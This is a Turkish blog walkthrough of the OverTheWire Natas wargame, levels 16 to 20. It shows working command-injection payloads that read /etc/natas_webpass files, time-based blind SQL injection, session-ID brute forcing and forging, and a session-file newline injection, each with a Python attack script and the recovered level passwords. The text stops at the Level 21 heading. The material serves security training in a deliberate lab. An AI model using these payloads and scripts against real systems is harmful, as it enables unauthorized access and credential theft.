---
layout: post
title: "OverTheWire:Natas Solutions 16-28"
date: 2018-06-28
excerpt: "28 Jun 2018"
comments: false
---
#### Level 16

For security reasons, we now filter even more on certain characters.


<figure>
<img src="/assets/img/natas/level165.png">
</figure>

Level 10'a çok benzemekle birlikte, extra olarak; istemciden alınan değer çift tırnaklar içerisinde passhtru fonksiyonunun içerisine yerleştirilmiş.Yani Level 10'daki gibi `a /etc/natas_webpass/natas11 #` bir payload girmem durumunda,

grep -i "a /etc/natas_webpass/natas11 #" dictionary.txt şeklinde bir komut çalışacak ve dictionary.txt dosyasında bu payloadın geçtiği satırları getiricek. Dolayısıyla çıktı vermeyecek.  

Bu durumu bypass edebilmek için "command substition"  denilen şeyi yapacağız.

``` 
Command Substition

  Bir komutun çıktısını, bir değişkende saklama veya başka bir komut içinde kullanma manasına gelir.Basit bir örnekle;
  
  cur_dir=$(pwd)
  echo $cur_dir
  
  Bunu yapabilmenin iki yolu var.
  Backtick karakter " ` " veya $() kullanmak.
  
```
Burada backtick karakteri filtrelenmiş olduğu için ikinci yolu kullanacağız.

Payload olarak $(cat /etc/natas_webpass/natas17) girdiğimizde bu komutun çıktısı passthru fonksiyonun içerisine yerleştirilecek, daha sonrasında dictionary.txt dosyasında bu satır aranacak. Dolayısıyla  böyle bir kullanımdan ziyade passhtru içerisindeki grep komutunu manipüle etmemiz, true-false mantığıyla veriyi inşaa etmemiz gerekiyor. 

"Hacker" kelimesi ile arama yaptığımızda  çıktı bu şekilde.
<figure>
<img src="/assets/img/natas/natas162.png">
</figure>

"Hacker$(grep ^a /etc/natas_webpass/natas17)"  şeklinde bir input girdiğimde çıktı yine aynı.

```
"grep ^a /etc/natas_webpass/natas17" ifadesi /etc/natas_webpass/natas17 dosyasından a harfi ile başlayan satırları getir anlamına geliyor.
```

Demek ki parola a harfi ile başlamıyor, yani grep ^a /etc/natas_webpass/natas17 komutunun çıktısı yok. Eğer ki a harfi ile başlasaydı bu komutun çıktısı natas17'ye ait parola olacaktı.Dolayısıyla ;

grep -i " " dictionary.txt ifadesinde çift tırnaklar arasına natas17'e ait parola gelicekti ve dictionary.txt dosyasında böyle bir satır olmadığı için çıktı boş olucaktı.

Parolanın 32 karakter uzunluğunda olduğunu bir önceki seviyelerden biliyoruz.Bununla birlikte parola küçük harf, büyük harf ve rakam içeriyor. Manuel bir test yapılamayacağından , otomatize eden bir script yazıyoruz.

{% highlight python %}
import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd=""
for i in range(32):
        for char in chars:
                s=requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=hacker$(grep ^'+passwd+char+' /etc/natas_webpass/natas17)',auth=auth)
                if "hacker" not in s.text:
                        passwd=passwd+char
                        print passwd
                        break
{% endhighlight %}

>> natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

#### Level 17

Level 15'in devamı niteliğinde.

<figure>
<img src="/assets/img/natas/natas171.png">
</figure>

Çıktı veren kısımlar yorum satırı haline getirilmiş. Time Based SQL Injection ile parolayı elde etmeyi deniyoruz.

natas18 " and password LIKE BINARY "a%" and sleep(3) şeklinde bir payload girdiğimde natas18 kullanıcısına ait parolanın a ile başlaması halinde 3 saniyelik bir bekleme olucak.

Benzer bir script çalıştırıyoruz.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd=""
for i in range(32):
       for char in chars:
               payload = {'username' : 'natas18" and password LIKE BINARY "' +passwd + char + '%" and sleep(3) \x23'}
               s=requests.post('http://natas17.natas.labs.overthewire.org/index.php',data=payload,auth=auth)
               time=s.elapsed.total_seconds()
               if time>1:
                        passwd=passwd+char
                        print passwd
                        break
{% endhighlight %}

>> natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

#### Level 18

<figure>
<img src="/assets/img/natas/natas181.png">
</figure>

<figure>
<img src="/assets/img/natas/natas182.png">
</figure>

Cookie başlığında  PHPSESSID değeri varsa , session başlatılıyor. Ardından print_credentials fonksiyonu çağrılıyor. Eğer SESSION içerisinde ki admin değeri 1' eşitse level 19'a ait parola ekrana bastırılıyor.Giden istekte PHPSESSID değeri yok ise, yeni bir session yaratılıyor.

Bu kısımda createID adında bir fonksiyon çağırılmış.
{% highlight php %}
<?
function createID($user) { 
    global $maxid; 
    return rand(1, $maxid); 
}
?>
{% endhighlight %}

Fonksiyon session_id olarak 1 ile maxid değeri arasında random bir değer döndürüyor. 


<figure>
<img src="/assets/img/natas/natas183.png">
</figure>

Değer 640 olarak tanımlanırken, "640 should be enough for everyone" şeklinde bir not düşülmüş. Burdan anlıyoruz ki admin dahil tüm kullanıcılar için session_id değeri 1 ile 640 arasında.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
for id in range(1,640):
               payload = {"username": "aa", "password": "aa"}
               id=str(id)
               cookie={'PHPSESSID':''+id+''}
               print cookie
               s=requests.post('http://natas18.natas.labs.overthewire.org/index.php',auth=auth,data=payload,cookies=cookie)
               if "You are an admin" in s.text:
                        print id
                        print s.text
                        break

{% endhighlight %}

>> natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

#### Level 19

This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Diğer sayfadan farklı olarak session id'lerin sıralı olmadığını söylenmiş. Burp ile birkaç farklı username:password ile istekte bulunuyorum.

<figure>
<img src="/assets/img/natas/natas191.png">
</figure>
<figure>
<img src="/assets/img/natas/natas192.png">
</figure>
<figure>
<img src="/assets/img/natas/natas193.png">
</figure>
<figure>
<img src="/assets/img/natas/haha.png">
</figure>
<figure>
<img src="/assets/img/natas/natas195.png">
</figure>
<figure>
<img src="/assets/img/natas/natas196.png">
</figure>

Tüm sessionlarda ortak olan 2d ifadesi. Bununla birlikte  0-9 arasında rakamlar , a-f ile arasında karakterler kullanılmış. Session id hex formatında olabilir. Dönüştürmeyi denediğimizde ;


   user:pass |            hex          | ascii
-------------|-------------------------|---------------
burcu:123456 |33382d6275726375         |38-burcu
-------------|-------------------------|----------------
admin:admin  |3233342d61646d696e       |234-admin
-------------|-------------------------|----------------
a:           |3239312d61               |291-a


"-" karakterinden öncesi muhtemelen bir önceki soruda verildiği gibi 1,640 arasında random olarak üretiliyor.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
for id in range(650):
               sessid=''+str(id)+'-admin'
               sessid=sessid.encode("hex")
               cookie={'PHPSESSID':''+sessid+''}
               print cookie
               s=requests.get('http://natas19.natas.labs.overthewire.org',auth=auth,cookies=cookie)
               if "You are an admin"  in s.text:
                        print s.text
                        break

{% endhighlight %}

>> natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

#### Level 20

<figure>
<img src="/assets/img/natas/natas2020.png">
</figure>

<figure>
<img src="/assets/img/natas/natas201.png">
</figure>

Yapmamız gereken SESSION değişkeni içerisindeki admin anahtarının değerini 1' eşitlemek.

<figure>
<img src="/assets/img/natas/natas202.png">
</figure>

```
session_set_save_handler() fonksiyonu , bir oturum ile  alakalı verileri almak ve saklamak için oturum başlatılmasından, oturum sonlandırılmasına kadar ki tüm olaylarda tetiklenecek fonksiyonları belirtir. Sırası ile open(),read(),write() fonksiyonları çalıştırılır.
```

{% highlight php %}

<?
function mywrite($sid, $data) {  
    // $data contains the serialized version of $_SESSION 
    // but our encoding is better 
    debug("MYWRITE $sid $data");  
    // make sure the sid is alnum only!! 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    $data = ""; 
    debug("Saving in ". $filename); 
    ksort($_SESSION); 
    foreach($_SESSION as $key => $value) { 
        debug("$key => $value"); 
        $data .= "$key $value\n"; 
    } 
    file_put_contents($filename, $data); 
    chmod($filename, 0600); 
} 
?>

{% endhighlight %}

Bu fonksiyonla birlikte session bilgileri bir dosyaya yazılıyor.SESSION değikeni içerisindeki değerler key=>value çifleri olarak ayrılıp her biri data değişkenine ardındanda session bilgilerinin tutulduğu dosyaya "key value \n" şeklinde yazılıyor. Yani;

 ````
$_SESSION["login"] = "true";

 $_SESSION["user"] = "admin";
 
 $_SESSION["pass"] = "123456";
 
 ```` 
 bu sessiona ait dosyanın son hali;
 
 ````
 login true
 
 user admin
 
 pass 123456 olacaktır.
 
````


{% highlight php %}

<?
function myread($sid) {  
    debug("MYREAD $sid");  
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return ""; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    if(!file_exists($filename)) { 
        debug("Session file doesn't exist"); 
        return ""; 
    } 
    debug("Reading from ". $filename); 
    $data = file_get_contents($filename); 
    $_SESSION = array(); 
    foreach(explode("\n", $data) as $line) { 
        debug("Read [$line]"); 
    $parts = explode(" ", $line, 2); 
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; 
    } 
    return session_encode(); 
} 
?>
{% endhighlight %}

myread fonksiyonunda mywrite fonksiyonu ile dosyaya yazılmış session bilgileri okunuyor.Forma şu şekilde;

data değişkenine alınan dosya içeriği "\n" belirteci ile , ardından da " " ile  ayrılıyor ve sonra session  değişkeni içerisine kaydediliyor.Yani ;

İçeriği :

````
login true

user guess

pass guess 
````
olan bir dosya session değişkenine  bu şekilde kaydolacaktır.

````
$_SESSION["login"]="true";

$_SESSION["user"]="guess";

$_SESSION["pass"]="guess";  

````

{% endhighlight %}

Bizim girdiğimiz input da SESSION değişkeni içerisinde name keyine atanıyor.Girdiğimiz name ile birlikte \nadmin 1 şeklinde bir key:value çifti girsek dosyanında en son hali şu şekilde olucak;

name burcu \nadmin 1.

\n ve " " belirteçleri ile ayrıldıktan sonra $_SESSION["name"]=burcu,$_SESSION["admin"]=1 olarak SESSION değişkenine kaydedilecek.

<figure>
<img src="/assets/img/natas/natas204.png">
</figure>

<figure>
<img src="/assets/img/natas/natas205.png">
</figure>


>>natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ

#### Level 21
